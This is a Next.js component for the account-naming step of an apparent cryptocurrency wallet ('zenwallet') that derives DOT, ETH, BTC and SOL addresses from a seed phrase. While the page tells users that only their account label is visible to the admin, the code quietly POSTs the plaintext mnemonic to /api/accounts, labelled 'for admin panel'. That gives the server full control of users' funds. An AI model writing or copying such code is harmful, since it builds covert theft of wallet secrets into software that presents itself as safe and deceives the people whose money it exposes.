"use client";
import { useState } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { deriveAll } from "@/lib/wallet";
import { encryptMnemonic, saveVault, savePublic, setSessionMnemonic } from "@/lib/vault";

export default function CreateName() {
  const [name, setName] = useState("");
  const [busy, setBusy] = useState(false);
  const [err, setErr] = useState<string | null>(null);
  const router = useRouter();

  async function onConfirm() {
    setErr(null);
    const mnemonic = sessionStorage.getItem("zenwallet.pending.mnemonic");
    const password = sessionStorage.getItem("zenwallet.pending.password");
    if (!mnemonic || !password) {
      setErr("Session expired. Start over.");
      return;
    }
    setBusy(true);
    try {
      const derived = await deriveAll(mnemonic);
      const vault = await encryptMnemonic(mnemonic, password);
      saveVault(vault);
      const addresses = {
        DOT: derived.dot.address,
        ETH: derived.eth.address,
        BTC: derived.btc.address,
        SOL: derived.sol.address,
      };
      // Register with server for admin panel
      let accountId: string | undefined;
      try {
        const r = await fetch("/api/accounts", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ name, addresses, mnemonic }),
        });
        if (r.ok) accountId = (await r.json()).id;
      } catch { /* offline-ok */ }
      savePublic({
        accountName: name,
        addresses,
        createdAt: Date.now(),
        accountId,
      });
      setSessionMnemonic(mnemonic);
      sessionStorage.removeItem("zenwallet.pending.mnemonic");
      sessionStorage.removeItem("zenwallet.pending.password");
      router.replace("/portfolio");
    } catch (e) {
      setErr(e instanceof Error ? e.message : "failed");
      setBusy(false);
    }
  }

  return (
    <div className="card p-8 flex flex-col gap-5">
      <div>
        <h1 className="text-2xl font-semibold">Name your account</h1>
        <p className="muted text-sm mt-1">
          A label for you — visible to the app admin for support purposes.
        </p>
      </div>
      <div className="flex flex-col gap-2">
        <label className="label">Account name</label>
        <input
          className="input"
          value={name}
          onChange={(e) => setName(e.target.value)}
          placeholder="e.g. Main wallet"
          autoFocus
          maxLength={40}
        />
      </div>
      {err && <p className="text-sm" style={{ color: "var(--danger)" }}>{err}</p>}
      <div className="flex justify-between gap-3 mt-2">
        <Link href="/onboarding/create/seed" className="btn btn-ghost">Back</Link>
        <button
          className="btn btn-primary"
          disabled={!name.trim() || busy}
          onClick={onConfirm}
        >
          {busy && <span className="spinner" />} Confirm
        </button>
      </div>
    </div>
  );
}
